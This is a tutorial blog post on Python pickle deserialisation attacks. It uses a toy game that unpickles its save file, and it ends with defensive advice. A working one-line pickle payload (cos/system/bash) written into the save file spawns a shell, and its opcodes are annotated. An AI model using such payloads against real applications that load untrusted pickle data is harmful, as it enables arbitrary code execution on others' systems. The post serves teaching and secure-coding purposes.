- 2020-03-08
- Deserialisation Attacks

If you have been programming for any length of time, you are bound to have come across JSON. JSON (JavaScript Object Notation) is a serialisation format for common datatypes. Whenever a service wishes to transfer data while maintaining its structure, it must serialise it to ensure the recieving service is able to interpret the data correctly. For stateless types (e.g. `int`, `float`, `dict`, etc.) we define a format which can be read directly back. However, for stateful types (e.g. file handles, objects, sockets, etc.) we may need to execute a deserialisation stub for the serialised object to appropriately initialise its state.

The Python programming language has two serialisation libraries: `pickle` and `marshal`. The `pickle` library is considerably more popular as `marshal` is highly dependent on your interpreter version. When reading the `pickle` [documentation](https://docs.python.org/3/library/pickle.html) you are greeted with:

```
Warning
The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling.
Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
Consider signing data with hmac if you need to ensure that it has not been tampered with.
Safer serialization formats such as json may be more appropriate if you are processing untrusted data.
See Comparison with json.
```

I will demonstrate the dangers of blindly deserialising data using `pickle`. Imagine you are playing a dungeon crawler then exit midway through.

```console
$ python game.py
kills: 0, deaths: 0, xp: 0
Welcome to the dungeon, player
[1] a Dark Knight approaches!
enter any key to proceed:
[[1]] player attacks Dark Knight dealing 21!
[[2]] Dark Knight attacks player dealing 13!
[[3]] player attacks Dark Knight dealing 19!
[[4]] Dark Knight attacks player dealing 15!
[[5]] player attacks Dark Knight dealing 20!
player killed the Dark Knight!
player gained 100xp!
[2] a Wizar approaches!
enter any key to proceed: ^C
```

However, when you restart the game you notice something.

```console
$ python game.py
loaded savefile
kills: 1, deaths: 0, xp: 100
Welcome to the dungeon, player
[snip]
```

The game preserved the state of your previous playthrough when you abruptly quit. We look at the game's `main` function.

```python
def main() -> None:
    if (game_state := load_recent_save()) is None:
        game_state = empty_game_state()
    else:
        print("loaded savefile")

    [snip]
```

We investigate the `load_recent_save` function.

```python
def load_recent_save() -> GameState:
    try:
        with open(".save", "rb") as f:
            unserialised = pickle.load(f)
    except FileNotFoundError:
        return None

    player = unserialised.player
    player.health = 200
    return GameState(player, Enemy())
```

The game is blindly deserialising the file `.save`. We can inspect this file.

```
00000000: 8004 95bf 0000 0000 0000 008c 085f 5f6d  .............__m
00000010: 6169 6e5f 5f94 8c09 5361 7665 5374 6174  ain__...SaveStat
00000020: 6594 9394 2981 947d 9428 8c09 7469 6d65  e...)..}.(..time
00000030: 7374 616d 7094 8c08 6461 7465 7469 6d65  stamp...datetime
00000040: 948c 0864 6174 6574 696d 6594 9394 430a  ...datetime...C.
00000050: 07e4 0308 1723 3900 21fd 9485 9452 948c  .....#9.!....R..
00000060: 0670 6c61 7965 7294 6800 8c06 506c 6179  .player.h...Play
00000070: 6572 9493 9429 8194 7d94 288c 046e 616d  er...)..}.(..nam
00000080: 6594 8c06 706c 6179 6572 948c 056b 696c  e...player...kil
00000090: 6c73 944b 018c 0664 6561 7468 7394 4b00  ls.K...deaths.K.
000000a0: 8c0a 6578 7065 7269 656e 6365 944b 648c  ..experience.Kd.
000000b0: 0668 6561 6c74 6894 4bc8 8c06 6461 6d61  .health.K...dama
000000c0: 6765 944b 1475 6275 622e                 ge.K.ubub.
```

`pickle` is a binary serialisation format but we can still see some textual data. What if we modify this file?

![bindiff of save files](assets/deserialisation_bindiff.png)

We successfully changed our player's name.

```console
$ python game.py
loaded savefile
kills: 1, deaths: 0, xp: 100
Welcome to the dungeon, haxxed
[1] a Wizar approaches!
```

The way `pickle` works is that it serialises the data and executes the steps involved in grabbing that data back out. What happens if we overwrite these deserialisation steps with our own?

```console
$ printf "cos\nsystem\n(S'bash'\ntR." > .save
$ python game.py
[user@beelzebub]: /tmp/tmp.aLb9xQwYe4>$
```

Here we have spawned a shell. The annotated payload is shown below.

```
(each field has a separating newline)

cos\nsystem <- push os.system to stack
(   <- marker
S 'bash'    <- 'bash' string constant
t   <- build tuple ('bash')
R   <- apply ('bash') to os.module
.   <- stop
```

To construct your own payloads you can reverse engineer the [format](https://github.com/python/cpython/blob/master/Lib/pickletools.py).

What is the takeaway from all of this? Do not deserialise untrusted data - or more broadly: do not blindly accept user data. All properties under user control can and should be treated as if the user will manipulate them maliciously. To defend yourself against this attack, the data could be encrypted using a symmetric key within the game itself although this approach falls into the obfuscation game with reverse engineers. Alternatively, the information could be stored on a trusted remote host and securely transmitted using PKI.

